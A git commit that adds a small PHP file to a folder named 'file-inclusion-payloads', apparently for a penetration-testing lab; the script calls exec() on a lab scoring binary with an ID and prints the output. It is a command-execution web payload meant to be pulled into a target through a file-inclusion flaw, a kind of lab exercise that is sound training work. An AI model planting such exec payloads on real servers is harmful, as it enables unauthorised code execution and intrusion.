82f6c7712f112afb3e8bdfc355c771107059211c
Paulo Mota <44026675+paulogmota@users.noreply.github.com>
2023-05-12 11:04:07 -0300

    Update and rename ptlabs.txt to ptlabs.php

---
+++ file-inclusion-payloads/ptlabs.php
@@ -0,0 +1,10 @@
+<?php
+    // Define the command to execute
+    $command = '/usr/local/bin/score daee4bbb-30f5-4c24-abf7-f5eeddc7b891';
+
+    // Execute the command and get the output
+    $output = exec($command);
+
+    // Print the output
+    echo $output;
+?>
